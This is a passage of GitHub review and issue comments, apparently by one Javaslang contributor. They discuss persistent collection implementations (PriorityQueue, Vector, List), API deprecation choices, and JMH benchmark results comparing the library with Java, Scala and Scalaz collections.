sure how Scala does this).\n. > We should keep our initial bit-mapped vector trie as simple as possible (along the existing Scala versions) and apply specific optimizations later.\nI already have an optimized create, iterate, get, update, and am working on drop, which will provide tail and init also.\nI'm hoping that I can achieve effectively constant time for drop(right),  prepend - and maybe even merge and random insert- also, but it gets quite complicated (there's no real documentation), I'm basically reinventing everything, as the optimized Scala and Clojure code is too criptic for me (and Clojure doesn't even provide prepend or slice).\n. @danieldietrich, we could add a version hint to the package also, as https://commons.apache.org/proper/commons-lang did: \n\nNote that Lang 3.0 (and subsequent versions) use a different package (org.apache.commons.lang3) than the previous versions (org.apache.commons.lang), allowing it to be used at the same time as an earlier versions.\n\nAlso, we could still add two versions now (@deprecated split and splitSeq) and have a single split in 3.0.\nOpinions?\n. Hmmm, isn't withDefaultValue and withDefaults used exactly for this purpose?\n* Turns this map from a partial function into a total function that\n* returns a value computed by defaultFunction for all keys\n* absent from the map.\n. @danieldietrich, I'm not sure what your question is :(\nI think computeIfAbsent is something like:\nJava\nregistry.get(user)\n        .getOrElse(List::empty);\ni.e. get a List from the Map, or if it's absent, return a default empty List, without modifying anything (unlike the Java version, which adds it to the Map also) ...\nThe problem with withDefault is that it doesn't return a map, therefore I cannot add back to it.\nWould it be enough to add a method next to get(key) like getOrElse(key, supplier)?\n. Awesome, will start working on it shortly :)\n. @danieldietrich, could you please assign this to me?\nI have translated most of the basic structure from the paper and the similarly cryptic Scalaz source -- I feel like a hacker who reverse engineered something that was not meant to be understood :p.\nI will need to make it more Java-like, add some basic tests and will push a draft this week.\nOnce that's working, I will add the rest of the inherited methods. :)\n. Please name the commits to represent logical actions: they should make the review as simple as possible.\nYou can rebase and force push them back, squashing related commits and separating unrelated modifications.\nAfter push, please comment the code to explain why you changed certain things (that might not be immediately obvious).\nThanks :)\n. I changed the implementation of one of my applications from Java 8 api to Javaslang and it got 5x slower.\nI think omitting these kind of changes -- that simplify the design -- are premature optimizations and aren't the bottleneck of the application.\n. I don't have to agree to accommodate, I pushed a new version with a fix for nullable supplier and with non-supplier based Option creation :)\n. @ruslansennov, I played with it as well, but seeing that it wasn't trivial, my only idea was to open an issue on separating the interfaces to smaller ones so that we can have a generic Map that contains only the common methods.\nIf you guys think it's an overkill, feel free to close the issue :)\n. You're right, updated the description.\n. Fixed in https://github.com/javaslang/javaslang/pull/1282\n. The code generator could simply be run before the compile (should integrate nicely with Idea).\nIn that case generated code shouldn't even be committed (probably solving https://github.com/javaslang/javaslang/issues/1265 also)\n. We have already introduced interface changes (see CharSeq.split) in this release.\nHowever, we could annotate all non-option methods with @Deprecated and provide alternatives.\n. Yup, that's what I meant by alternative.\nWill push a version shortly :)\n. @danieldietrich, what about CharSeq, that don't inherit them from Seq (they accept char, not String)?\n. I agree, but let's configure Idea in a way that the default formatting doesn't change any lines (so that people are encouraged to format their work).\n. Sure, will do :)\n. We might be able to configure Gradle to fail the build in case it's unformatted: https://github.com/diffplug/spotless (I presume it's not working as nicely as Idea's formatter does)\n. Nice! :)\nIf I may suggest, If we've opened up Try already, please consider creating some tests for the uncovered methods also https://codecov.io/github/javaslang/javaslang/javaslang/src/main/java/javaslang/control/Try.java?ref=196914af043e5ba2b9860c0aae05ad8a04be2d2a :)\n. The tests seem too big ... the changes there are mainly static imports from the SUT and added missing tests to maximize coverage.\n. Hope I'll prove that I can create also, not just clean :p\n. \n. Code coverage is unaffected...\n. head\u2194last (first\u2194last)\ninit\u2194tail (all - last)\u2194(all - first)\nI agree that the naming is quote unfortunate, but functional programming is filled with these (e.g. List.map will return a List (not a Map), filter (will this return those that match or those that don't?) instead of find ... or simply Java's String instead of Text or something... and let's not get started on flatMap or foldRight).\nGroovy dared to rename some of these -- which make a lot more sense in my opinion --, but since Javaslang is meant as a Scala alternative for Java (I think), it might be best to appeal to existing Scala users.\nps. I would vote for no *Entry, we're not following Java conventions (and not returning an Entry)\n. If I understood it correctly, the only difference is that you did a manual tail call optimization in the first example, right?\nSince it's logarithmic, you probably won't get a stack overflow, I'm personally ok with both.\nI'm not sure yet, how this will return the greatest element in this set less than or equal to the given element, but will investigate once it's pushed :).\nNotes / personal preferences:\n- Maybe change the if's to else ifs, where applicable to signal to the user that they're mutually exclusive :)\n- In the first case the while can be a for, if you don't mind leaving the update part empty\n- not sure what the empty.comparator is exactly (shouldn't there be a local comparator), but can we extract it outside the loop?\n- could we reorder the ifs to <, =, >\n- maybe try a switch (normalized by signum?), to signal that the subject of the comparison is the same?\n. > used a java.util.Deque instead of a javaslang Stack inside of the RedBlackTree\nIf you can guarantee that the mutability won't leak out and you don't need to synchronize the object for certain operations, it should be ok. Also, the readability of the code shouldn't change too much.\nGenerally I tend to use mutability inside a method only, builder-pattern style.\n. https://github.com/javaslang/javaslang/pull/1317 addresses this issue, but it's in review for almost a year.\n@eduardmanas, @danieldietrich, what's the reason for that?. Yup, thanks for asking :).\n. The 3.0 branch seems to be up to date already (i.e. a single split, returning a a Seq), only the 2.1 should be downgraded -- done in this commit.\nOpinions @danieldietrich, @sajit, @ruslansennov, @jest?\n. Yes, it's used in the other PR.\n. @danieldietrich, @ruslansennov, @Houston, we have a problem :(\nWhile the implementation seems to be working exactly as the reference Java impl for 50_000 elements (random inserts and pops) ... this implementation is 2300x SLOWER than the reference -- 42 s vs 18 ms. :(\nThat's way beyond unacceptable. I may be able to make it quicker by expanding some recursive calls or creating non-boxed version, but not by this much.\nI guess this is the reason Scala has only a mutable PriorityQueue.\nAny help would be appreciated :/\n. I profiled it already and the comparator was going crazy, crashing with stack overflow, even though it had only ~5 elements.\nIt had something to do with the SerializableComparator, replacing it with a simple Comparator reduced the speed difference to only 10x slower (and I don't get stack overflows anymore) ... Further optimizations reduced the difference to ~6x slower.\nI pushed the new version.\n. > and the history gets lost\nThey're not dead, just sleeping: https://github.com/javaslang/javaslang/pull/1300#discussion_r61182293.\nYou can still acces them via the Conversations view, folded in e.g.\nruslansennov and 1 other commented on an *outdated diff*       Show 4 comments.\nAlso, they only disappear when the affected lines were changed, so the question may not be relevant anymore (I usually put important questions back).\nIf that bothers you, I will try to minimize force pushes (though I really prefer focused and clean commits)\n\nI want to understand why it is so much slower. Is it a Java bug?\n\nThis library really stretches the boundaries of the Java and Idea compiler, the codebase is filled with false positives from Idea and many compiler crashes. ~~I wouldn't be surprised if this were a JVM bug also.~~\nFound the problem, it was an infinite wrapping of SerializableComparator's, not sure how I or the debugger missed this.\nSince there were no comments for the modified lines, I force pushed the change :), thanks for your help.\n. Force pushed a new version, because refactorings made the changes hard to follow.\n@danieldietrich, @ruslansennov, @eduardmanas, all tests are passing now, waiting for your reviews :)\n. JMH banchmark against Java's (mutable) and ScalaZ's (immutable, based on the same paper) is the following for sorting (insert, peek and pop) a thousand and a million elements is the following:\n```\nBenchmark                        (CONTAINER_SIZE)  Mode  Cnt     Score      Error  Units\nSlangPriorityQueue.sort_java                1000  thrpt    6  8191.985 \u00b1 2051.859  ops/s\nSlangPriorityQueue.sort_slang               1000  thrpt    6   820.778 \u00b1   11.744  ops/s\nSlangPriorityQueue.sort_scalaz              1000  thrpt    6   151.453 \u00b1    8.139  ops/s\nSlangPriorityQueue.sort_java             1000000  thrpt    6     0.813 \u00b1    0.074  ops/s\nSlangPriorityQueue.sort_slang            1000000  thrpt    6     0.114 \u00b1    0.006  ops/s\nSlangPriorityQueue.sort_scalaz           1000000  thrpt    6     0.050 \u00b1    0.009  ops/s\n```\nFor 1000 elements the Java impl is 10x faster, while the ScalaZ alternative is 5x slower than this impl.\nFor 1_000_000 elements the Java impl is 7x faster, while the ScalaZ alternative is 2x slower than this impl.\n@danieldietrich, @ruslansennov, @eduardmanas, do you guys see any other place for optimizations :)? \n. Thank you @eduardmanas, very useful comment, will investigate your results. I guess the problem is that the trees turned into a linked lists because of all that equality.\n\nJava/Scala communication\n\nNot sure what you mean, they're both simple bytecode.\n. > However, the interesting bit is that the JavaSlang performance deteriorated dramatically with very large collections (92x slower than Java)\n@eduardmanas, awesome observation, fixed it by changing a < to <= :D:D:D.\nThe problem was that the old algorithm tried to pop the last minimum from the list (not the first one) and had to rebuild the whole list when many duplicates were found.\nRunning the benchmarks with the fixed code and 10 distinct priorities results in:\n```\nBenchmark                       (CONTAINER_SIZE)   Mode  Cnt     Score     Error  Units\nSlangPriorityQueue.sort_java                1000  thrpt    6  9427.463 \u00b1 263.636  ops/s\nSlangPriorityQueue.sort_slang               1000  thrpt    6  1198.835 \u00b1  50.930  ops/s\nSlangPriorityQueue.sort_scalaz              1000  thrpt    6   238.663 \u00b1   5.061  ops/s\nSlangPriorityQueue.sort_java             1000000  thrpt    6     3.352 \u00b1   0.066  ops/s\nSlangPriorityQueue.sort_slang            1000000  thrpt    6     0.838 \u00b1   0.047  ops/s\nSlangPriorityQueue.sort_scalaz           1000000  thrpt    6     0.148 \u00b1   0.035  ops/s\n```\ni.e. it's 7.8x/4x (1000/1_000_000 elements) slower than the Java impl in case of very high congestion and 5x/5.6x faster than Scalaz.\nIn low congestion (i.e. only a few duplicates):\n```\nBenchmark                       (CONTAINER_SIZE)   Mode  Cnt     Score     Error  Units\nSlangPriorityQueue.sort_java                1000  thrpt    6  8454.770 \u00b1 157.659  ops/s\nSlangPriorityQueue.sort_slang               1000  thrpt    6   806.209 \u00b1 113.718  ops/s\nSlangPriorityQueue.sort_scalaz              1000  thrpt    6   151.593 \u00b1   2.770  ops/s\nSlangPriorityQueue.sort_java             1000000  thrpt    6     0.839 \u00b1   0.013  ops/s\nSlangPriorityQueue.sort_slang            1000000  thrpt    6     0.131 \u00b1   0.034  ops/s\nSlangPriorityQueue.sort_scalaz           1000000  thrpt    6     0.049 \u00b1   0.008  ops/s\n```\ni.e. it's 10x/6.4x (1000/1_000_000 elements) slower than the Java impl in case of low congestion and 5.3x/2.6x faster than Scalaz.\n. Added benchmarks for Scala also and changed the sizes to 10, 1000 and 100_000 to be more realistic.\nSomebody should validate the scala(z) findings, they seem extremely slow.\nAlso, maybe we should treat small PQs differently to gain some speed (e.g. array copy of a normal Java.PriorityQueue). Opinions @danieldietrich, @ruslansennov, @eduardmanas?\n```\nBenchmark                           (CONTAINER_SIZE)   Mode  Cnt       Score       Error  Units\nPriorityQueueBenchmark.sort_java                  10  thrpt    9  3328561.254 \u00b1 205023.376  ops/s\nPriorityQueueBenchmark.sort_scala                 10  thrpt    9   607408.498 \u00b1   8640.520  ops/s\nPriorityQueueBenchmark.sort_scalaz                10  thrpt    9    52187.109 \u00b1   1029.977  ops/s\nPriorityQueueBenchmark.sort_slang                 10  thrpt    9   441307.317 \u00b1  30631.099  ops/s\nPriorityQueueBenchmark.sort_java                1000  thrpt    9     8679.129 \u00b1    132.830  ops/s\nPriorityQueueBenchmark.sort_scala               1000  thrpt    9      113.641 \u00b1      2.819  ops/s\nPriorityQueueBenchmark.sort_scalaz              1000  thrpt    9      156.114 \u00b1      2.169  ops/s\nPriorityQueueBenchmark.sort_slang               1000  thrpt    9      869.553 \u00b1     25.979  ops/s\nPriorityQueueBenchmark.sort_java              100000  thrpt    9       34.606 \u00b1      0.227  ops/s\nPriorityQueueBenchmark.sort_scala             100000  thrpt    9        0.010 \u00b1      0.001  ops/s\nPriorityQueueBenchmark.sort_scalaz            100000  thrpt    9        0.779 \u00b1      0.020  ops/s\nPriorityQueueBenchmark.sort_slang             100000  thrpt    9        2.392 \u00b1      0.172  ops/s\n``\n. @eduardmanas, It was fishy to me too -- I used it incorrectly, as if it were immutable, which copied the whole thing for everytail` call.\nFixed it and added an immutable, array copy-ing alternative to PriorityQueue, to test for how many elements it's faster (even though it's n^2). The result is a disappointing 6000 elements (both impls perform ~80 sorts per second). Maybe we should see whether it produces more or less garbage and decide on the ideal switching point.\n@danieldietrich, did I implement this whole thing in vain :/ ... who uses a PriorityQueue for more than 6k elements?\nLatest measurements:\n```\nBenchmark                                (CONTAINER_SIZE)   Mode  Cnt        Score        Error  Units\nPriorityQueueBenchmark.sort_java                       10  thrpt    6  3247152.189 \u00b1  65416.921  ops/s\nPriorityQueueBenchmark.sort_scala                      10  thrpt    6  2055650.134 \u00b1  31190.884  ops/s\nPriorityQueueBenchmark.sort_scalaz                     10  thrpt    6    48608.584 \u00b1   6434.882  ops/s\nPriorityQueueBenchmark.sort_slang                      10  thrpt    6   435160.521 \u00b1  21768.469  ops/s\nPriorityQueueBenchmark.sort_slang_small                10  thrpt    6  1134546.639 \u00b1 197713.276  ops/s\nPriorityQueueBenchmark.sort_java                     1000  thrpt    6     8352.687 \u00b1    416.892  ops/s\nPriorityQueueBenchmark.sort_scala                    1000  thrpt    6     5574.914 \u00b1    450.793  ops/s\nPriorityQueueBenchmark.sort_scalaz                   1000  thrpt    6      146.761 \u00b1     12.799  ops/s\nPriorityQueueBenchmark.sort_slang                    1000  thrpt    6      792.690 \u00b1    115.001  ops/s\nPriorityQueueBenchmark.sort_slang_small              1000  thrpt    6     2587.258 \u00b1    155.719  ops/s\nPriorityQueueBenchmark.sort_java                   100000  thrpt    6       33.090 \u00b1      1.684  ops/s\nPriorityQueueBenchmark.sort_scala                  100000  thrpt    6       20.078 \u00b1      3.477  ops/s\nPriorityQueueBenchmark.sort_scalaz                 100000  thrpt    6        0.731 \u00b1      0.051  ops/s\nPriorityQueueBenchmark.sort_slang                  100000  thrpt    6        2.222 \u00b1      0.285  ops/s\nPriorityQueueBenchmark.sort_slang_small            100000  thrpt    6        0.237 \u00b1      0.002  ops/s\n``\n. I added a result aggregator forJMH` that calculates ratios:\nRatios for: [10, 1000, 100000]\nsort_java/sort_scala             : [1.57, 1.50, 1.57]\nsort_java/sort_scalaz            : [62.77, 58.05, 44.76]\nsort_java/sort_slang             : [7.80, 11.17, 14.58]\nsort_java/sort_slang_delegating  : [2.37, 3.23, 140.95]\nsort_scala/sort_scalaz           : [39.96, 38.62, 28.47]\nsort_scala/sort_slang            : [4.96, 7.43, 9.27]\nsort_scala/sort_slang_delegating : [1.51, 2.15, 89.67]\nsort_scalaz/sort_slang           : [0.12, 0.19, 0.33]\nsort_scalaz/sort_slang_delegating: [0.04, 0.06, 3.15]\nsort_slang/sort_slang_delegating : [0.30, 0.29, 9.67]\n. @danieldietrich, my girlfriend is finally coming home tomorrow, so I won't I have as much time this week :dancer: \n. I've put some assertions to make sure it's functioning correctly and they fail in some cases, still investigating why :/\n. After some serious optimizations (and fixing a small bug) the current status looks really good:\nRatios for: [10, 1000, 100000]\nsort_java_mutable/sort_scala_mutable        : [1.51, 1.47, 1.51]\nsort_java_mutable/sort_scalaz_persistent    : [62.98, 58.71, 44.04]\nsort_java_mutable/sort_slang_persistent     : [5.16, 4.95, 4.96]\nsort_scala_mutable/sort_scalaz_persistent   : [41.59, 39.93, 29.16]\nsort_scala_mutable/sort_slang_persistent    : [3.41, 3.36, 3.28]\nsort_scalaz_persistent/sort_slang_persistent: [0.08, 0.08, 0.11]\nmeaning that this impl is ~5x slower than the mutable Java version, ~3x slower than the mutable Scala version and ~10x faster than the persistent Scalaz version.\n@danieldietrich, @ruslansennov, @eduardmanas, opinions?\nLet's merge it in :)\n. > it expects that you only test one operation per benchmark file\nI only implemented what I needed now, feel free to extend it later to your needs (or suggest them to me and I will gladly extend it). E.g. we could provide some naming convention (the @group annotation does lots of other things that I don't trust).\n\nThink about it, if both tests finished in 100 op/s, your calculation would say one is 1x faster than the other, while the correct calculation would be 0x.\n\nIf we read x as times faster, then it implies multiplication, therefore in a = 1 op/s vs b = 2 op/s, b is two times faster, i.e. b/a = 2\n\nAlso, a common use case for the PriorityQueue is to write from one thread and read from another\n\nYou cannot write (i.e. mutate) this implementation, I'm not sure it's relevant in this case.\n\nbenchmark individual operations\n\nI did, but measuring a mutable data structure is tricky ... should I clone it in the method itself or in the setup and ruin the performance of the rest, i.e. it cannot be bulk-unwrapped anymore by JMH because of the side-effects.\nI will think of something :/\n. @eduardmanas Added groups to the BenchmarkResultAggregator and also simple benchmarks for adding elements to the PQ.\nHow do you suggest I test the enqueue and dequeue operations?\nI don't like the idea of creating separate mutable and immutable versions and copying the mutable one before each dequeue operation :/\n. Yes, that's what I meant by it cannot be bulk-unwrapped anymore, the immutable test contents will probably be copy-pasted n times one after the other, while the mutable one will have a setup before each ... it wouldn't be a fair comparison, I think.\n. @danieldietrich: FYI, this impl has logarithmic operations, no O(1) complexity global root or bootstrapping present (yet?)\nI will experiment with those within a few days, probably :)\n. > Or am I missing something?\nhow can I dequeue two times with the same preconditions? If I include the enqueue code with the deque, I will get the sort that I already have. If I don't dequeue, I have the add methods that I already provided. How should I test the dequeue only?\n. Thank you @eduardmanas, I pushed a new version, based on your suggestion :)\nChanged the aggregator also to compare results based on enclosing class, not name prefix.\nRatios for: [10, 1000, 100000]\nGroup 'Enqueue':\njava_mutable/scala_mutable        : [1.30, 1.49, 1.75]\njava_mutable/scalaz_persistent    : [10.90, 7.99, 6.28]\njava_mutable/slang_persistent     : [2.20, 1.62, 1.55]\nscala_mutable/scalaz_persistent   : [8.38, 5.37, 3.58]\nscala_mutable/slang_persistent    : [1.69, 1.09, 0.89]\nscalaz_persistent/slang_persistent: [0.20, 0.20, 0.25]\nGroup 'Dequeue':\njava_mutable/scala_mutable        : [1.27, 1.30, 1.33]\njava_mutable/scalaz_persistent    : [49.16, 57.69, 38.02]\njava_mutable/slang_persistent     : [5.99, 5.32, 4.58]\nscala_mutable/scalaz_persistent   : [38.64, 44.40, 28.49]\nscala_mutable/slang_persistent    : [4.71, 4.09, 3.43]\nscalaz_persistent/slang_persistent: [0.12, 0.09, 0.12]\nGroup 'Sort':\njava_mutable/scala_mutable        : [1.51, 1.47, 1.59]\njava_mutable/scalaz_persistent    : [61.20, 57.98, 46.03]\njava_mutable/slang_persistent     : [5.14, 4.96, 5.33]\nscala_mutable/scalaz_persistent   : [40.58, 39.45, 28.99]\nscala_mutable/slang_persistent    : [3.41, 3.38, 3.36]\nscalaz_persistent/slang_persistent: [0.08, 0.09, 0.12]\nEdit: it's interesting that equeue is faster for many elements than the mutable Scala version.\n. @danieldietrich, @ruslansennov, separated the controversial Iterator modifications to a separate PR.\n. @danieldietrich, Pap is my family name, feel free to call me L\u0151rinc :)\n. the idea of providing a sorted method, like in List?\n. Not sure I follow :/\nYou don't agree with the issue, or the suggested method signature or the internal impl?\n. Another alternative: Add toSortedSet to Value\njava\n/**\n * Converts this to a {@link SortedSet}.\n *\n * @return A new {@link TreeSet}.\n */\ndefault SortedSet<T> toSortedSet(Comparator<? super T> comparator) {\n    return ValueModule.toTraversable(this, TreeSet.empty(comparator), value -> TreeSet.of(comparator, value), values -> TreeSet.ofAll(comparator, values));\n}\n@danieldietrich, @ruslansennov?\nEdit: maybe do the same with toMultiMap, toSortedQueue, (toBitSet)?\n. Maybe, but if you do understand it, why would you use its get method?\n. Me too, it's the exact reason it was suggested to be deprecated.\nYou could still use that after deprecation, it would just signal that it isn't the way it was supposed to be used.\n. > Scala's double range is backed by Double\nQuoting from Range.scala:\n// Double works by using a BigDecimal under the hood for precise\n  // stepping, but mapping the sequence values back to doubles with\n  // .doubleValue.  This constructs the BigDecimals by way of the\n  // String constructor (valueOf) instead of the Double one, which\n  // is necessary to keep 0.3d at 0.3 as opposed to\n  // 0.299999999999999988897769753748434595763683319091796875 or so.\n. Unfortunatly @danieldietrich thinks this complicates the API: https://github.com/javaslang/javaslang/pull/1320/files#r62437967\n. > The drawback is that we are cannot able to re-use set-up and warm-up for related operations, so the tests will take longer to run.\nAs already stated, I consider this a feature also, as unrelated things shouldn't be warmed up together.\nI think the two solutions should be merged, I like the output of your style better, while mine results in better encapsulation for the performance tests.\n. @eduardmanas, I've pulled your change, holy crap it's big (that's what she said).\nUnfortunately GitHub doesn't show half of it, there was no way for me to understand it that way.\nIt looks like a really awesome job, I would love to spend more time understanding it :).\nYou would help us a lot by rebasing it and changing it to many small commits, separating important changes from unimportant ones (e.g. renaming ValueNode/toLispString, removing redundant casts/types, or changing empty, left, right to methods etc. should go in a separate commit, as it hides many important changes. Important changes should also go in separate commits, e.g. \"added descending iterator to RBT\", it's just way to overwhelming this way).\nAlso, could you please make the local vars final (Daniel prefers it that way), correct a few missing javadocs (e.g. empty return), put else ifs to same line as closing paren (again, unimportant changes that distract us from understanding the important ones), don't comment out code, delete it, etc, review each line yourself also and decide whether you want us to spend time on it or not.\nKeep it up :)\n. @eduardmanas, no problem, let's hope @danieldietrich can review it this way also.\n. I usually prefer forced pushed, but I can't review commits this big, I hope @danieldietrich can :)\n. @eduardmanas, @danieldietrich, I hope this PR isn't dead. :). After some possibly controversial optimizations (@danieldietrich, please don't get mad at me), the add and iterate speeds are surprisingly close to the mutable one:\n``` Groovy\nRatios for: [10, 100, 1000, 10000]\nGroup 'AddAll':\nslang_persistent/fjava_persistent       : [2.00, 2.20, 1.91, 1.95]\nslang_persistent/java_mutable           : [1.50, 1.28, 1.14, 1.21]\nslang_persistent/pcollections_persistent: [1.18, 1.17, 0.91, 1.45]\nslang_persistent/scala_mutable          : [1.68, 1.56, 1.15, 1.22]\nslang_persistent/java_mutable_linked    : [1.56, 1.60, 1.22, 1.35]\nslang_persistent/scala_persistent       : [1.21, 1.44, 1.08, 1.33]\nRatios for: [10, 100, 1000, 10000]\nGroup 'Iterate':\nslang_persistent/fjava_persistent       : [1.43, 1.48, 1.54, 1.04]\nslang_persistent/java_mutable           : [0.91, 0.56, 0.46, 0.43]\nslang_persistent/pcollections_persistent: [1.01, 1.00, 1.34, 1.01]\nslang_persistent/scala_mutable          : [1.38, 1.08, 0.96, 0.93]\nslang_persistent/java_mutable_linked    : [1.00, 0.86, 0.89, 1.29]\nslang_persistent/scala_persistent       : [1.43, 1.44, 1.21, 0.96]\n```\ni.e. slang's List is now almost always faster than pcollections,fjava, and persistent and mutable scala.\nIt's slightly slower (but very close) to ArrayList and LinkedList.\nPlease take a look at the commits and tell me what I should keep, split in separate commits or just revert.\n. The Array optimizations for add and iteration are more evident, i.e.\nBefore:\nGroovy\nGroup 'AddAll':\njava_mutable/slang_persistent: [5.04, 10.79, 76.37]\nGroup 'Iterate':\njava_mutable/slang_persistent: [4.25, 24.84, 427.45]\nafter\nGroovy\nGroup 'AddAll':\njava_mutable/slang_persistent: [10.35, 22.46, 109.96]\nGroup 'Iterate':\njava_mutable/slang_persistent: [2.08, 5.09, 9.85]\nWhile add became slightly slower (it's still in the tens of millions per second), iteration via tail became a lot faster.\n. As stated in https://github.com/javaslang/javaslang/pull/1321#discussion_r62435298, this makes many O(n) operations O(1).\n. Closed via https://github.com/javaslang/javaslang/pull/1321\n. @eduardmanas, thank you for your hard work :)\nI find 50 iterations way to many, ain' nobody got time for that :/.\nFor the 5 warmups for array, I found that the difference was very small after that (<10%), and increasing it a lot changed the precision only marginally (actually often more warmup slowed it down often ... weird).\nI was interested in optimizing certain operations (e.g. from 450x slower to 10x slower ...), for those 5 + 3 iterations were enough :)\nPlease feel free to contribute these great ideas you suggested, should be easier than explaining them.\nIt was meant as a basis that should be expanded to our needs :).\n. > differences between the first and second runs are massive\nI think it really differs on what you want to use it for. I used it for relative comparisons, i.e. how much faster does it get by doing certain kinds of changes. In those cases I have to trade speed for accuracy, I cannot wait 40 minutes for one test :/\nWould \"-XX:CompileThreshold=1000\" help? We're running the same scenarios over and over, no alternative routes to choose from (i.e. premature warmups for non-hotspots).\nI re-ran the ListBenchmark this way and the differences seemed acceptable to me (measurable, but with few surprises), compared to how many more iterations we would need to improve it measurably.\n. GC is disabled for these tests. \n. I meant the option .shouldDoGC(false)\n. Not sure if this changes anything, byt judging from https://www.youtube.com/watch?v=QnMDsI2GbOc\n\nthis may be a non-issue in Java 9.\n. I agree, it's just a FYI :)\n. It seems strange to me that we're removing the highest throughput, since that should've had the best SNR, i.e. the cleanest run.\nFYI, using -XX:+PrintGC (or -verbose:gc) shows that there is some minor GC activity going on, often even after warmup.\nFor ArrayBenchmark, with no forced GC activity between measurements (.shouldDoGC(false)) and a 1g heap, it has 72 youngs; with 4g heap only 26, .\nForcing GC between runs reduces it to 5, happening only in the warmup period.\nIncreasing the young generation size to the entire allocated heap (XX:G1NewSizePercent=100) made the young generations disappear (for bigger sample size setting XX:MaxGCPauseMillis to a big value -- so that it happens infrequently -- reduced the needed intermediary youngs):\njava\n    @Fork(value = 1, jvmArgsAppend = { \"-server\", \"-XX:+UseG1GC\", \"-Xss100m\", \"-Xms4g\", \"-Xmx4g\", \"-XX:+PrintGC\", \"-XX:+TieredCompilation\", \"-XX:CompileThreshold=1500\", \"-XX:MaxGCPauseMillis=1000\", \"-XX:+UnlockExperimentalVMOptions\", \"-XX:G1NewSizePercent=100\", \"-XX:G1MaxNewSizePercent=100\", \"-disableassertions\" }) /* set fork to 0 if you want to debug */\nWill create a PR with these settings for the existing benchmarks.\n. I think this can be closed.\n@danieldietrich, @eduardmanas?\n. Sure, I'm interested, and it seems @eduardmanas is also.\nGreat job there, will take a look at the code shortly :)\n. Yeah, Queue is in the first list (sequential), while TreeSet is in the second.\nAdded it in the first, even though it doesn't fit perfectly.\n. In order to increase confidence in all those state changes, could we add a property based test that validates it against Java's BitSet after each step? Something similar to https://github.com/javaslang/javaslang/blob/master/javaslang/src/test/java/javaslang/collection/PriorityQueueTest.java#L226 (or better)\nAlso, if you think it is appropriate, please consider adding benchmarks for your important methods (depends on https://github.com/javaslang/javaslang/pull/1335)\n. It's progressing really nicely, @danieldietrich, @ruslansennov, what's the state of this PR? :)\n. > I have this little fella in my head that keeps telling me it doesn't \"feel natural\"\n\n. I don't have to agree for it to be accepted, though I still keep my original concern about enabling assertions for performance tests.\n. The problem is mostly that append was used for Stream, instead of prepend and reverse.\nWill provide a PR shortly with something like\njava\n@Override\ndefault <C> Map<C, Iterator<T>> groupBy(Function<? super T, ? extends C> classifier) {\n    Objects.requireNonNull(classifier, \"classifier is null\");\n    if (isEmpty()) {\n        return HashMap.empty();\n    } else {\n        final java.util.Map<C, Collection<T>> results = new java.util.HashMap<>();\n        for (T value : this) {\n            final C key = classifier.apply(value);\n            Collection<T> values = results.get(key);\n            if (values == null) {\n                values = new ArrayList<T>();\n                results.put(key, values);\n            }\n            values.add(value);\n        }\n        return HashMap.ofAll(results).map((c, ts) -> Tuple.of(c, List.ofAll(ts).iterator()));\n    }\n}\nwhich is only <2x slower than the Java impl\n. @eirikm, @danieldietrich, please review :)\n. I don't know, I haven't worked on this explicitly, not sure why it was opened.\n. @danieldietrich, I think this is mislabeled\n. @mvh77, I have 2 open PRs for Vector currently, one for benchmarks, the other for some optimizations.\n. Would it be possible to store all the hashCodes in a single static map in Traversable intead?\nIt could use Guava's cache builder (or anything similar) with concurrent, weak, identity keys, and use the iterator() as the base for hashCode calculation.\nThis way hashCode would be lazy, the memory consumption would be minimal and the speed would be similar to the stored one.\nEdit: we could do the same for sizes -- and other lazy constructs\n. So is my suggestion, but for free (i.e. simpler client side code)\n. Everything was const\u1d49\u1da0\u1da0 before in the table, even though I think they were logarithmic in reality (i.e. Map has log for remove)\n. @danieldietrich, @ruslansennov, @eduardmanas, @zsolt-donca, please review and try to find counter-examples that should still be tested :)\n. Thank you @ruslansennov, very useful comments, I force pushed the fix to the bug you pointed out :) (it was an index mismatch in append).\nAbut storing the underlying map, people can simply normalize it via ofAll(iterator()) any time, I consider it a separate memory optimization issue.\n. @danieldietrich, @ruslansennov, this is the same as Array, i.e. the delegate might be bigger than it appears.\nIf this seems like a valid problem, it could be resolved similarly to how ArrayList solves it (which has usually more allocated space than necessary also), i.e. if the masked out region is bigger than the visible one, the with method won't change the offsets, but copy the actual content instead.\nIf I'm mistaken correctly, this way the complexity of e.g. consuming n elements with drop(1) would be around O(2n), while before it was O(n\u00b2).\nOpinions?\n. Could you please react to my response to your concern also?\n. > but it must know what he doing\nI think this logic is applicable to my version also!\n. @danieldietrich, I think I addressed @ruslansennov's concerns about memory consumption and I think these changes could be applied even if the Vector impl is changed!\nJust take a look at how much faster the tail and slice operations are compared to anything else (e.g. ~10x faster than Scala), while consuming the same amount of amortized memory (i.e. O(2n) worst case while providing O(1) operations for many operations -- which can actually consume a lot less memory, if more instances are kept).\nI don't think the implementation got a lot more complicated, since I reused lots of parts internally.\nEdit:\nBefore the change (times faster):\njava\nVectorBenchmark Tail  slang_persistent/fjava_persistent         7.77x  14.43x 10.47x\nVectorBenchmark Tail  slang_persistent/java_mutable             0.82x   0.84x  1.23x\nVectorBenchmark Tail  slang_persistent/pcollections_persistent  1.02x   1.65x  1.77x\nVectorBenchmark Tail  slang_persistent/scala_persistent         0.62x   1.01x  0.99x\nVectorBenchmark Slice slang_persistent/java_mutable             0.07x   0.00x  0.00x\nVectorBenchmark Slice slang_persistent/scala_persistent         0.51x   0.07x  0.01x\nAfter:\njava\nVectorBenchmark Tail  slang_persistent/fjava_persistent        61.34x  114.41x  128.79x \nVectorBenchmark Tail  slang_persistent/java_mutable             7.01x    7.24x   15.55x \nVectorBenchmark Tail  slang_persistent/pcollections_persistent  8.33x   14.09x   21.29x \nVectorBenchmark Tail  slang_persistent/scala_persistent         5.08x    8.90x   12.61x \nVectorBenchmark Slice slang_persistent/java_mutable             0.90x    0.91x    0.79x\nVectorBenchmark Slice slang_persistent/scala_persistent         6.24x   14.79x   15.39x\n. The memory consumption of my implementation has the same amortized complexity (!), while being a lot faster for some methods (e.g. 1500x faster than Scala for 1000 elements). These optimizations should be done even if the HAMT is changed: it's unrelated.\nNot sure why @ruslansennov didn't explain the \"whole picture\" here, so that we can talk about it, but it's your library, you decide.\nFeel free to use the \"unrelated\" parts from this commit, I'm not planning on doing it.\nKeep up the good work with Javaslang!\n. Apparently result.toVector() on line 55 in Vector.java isn't trimming correctly.\nIf we change it to result.map(Function.identity()) instead, the above expression will have exactly 10 backing elements:\njava\n@Test\npublic void test() {\n    assertThat(Vector.range(0, 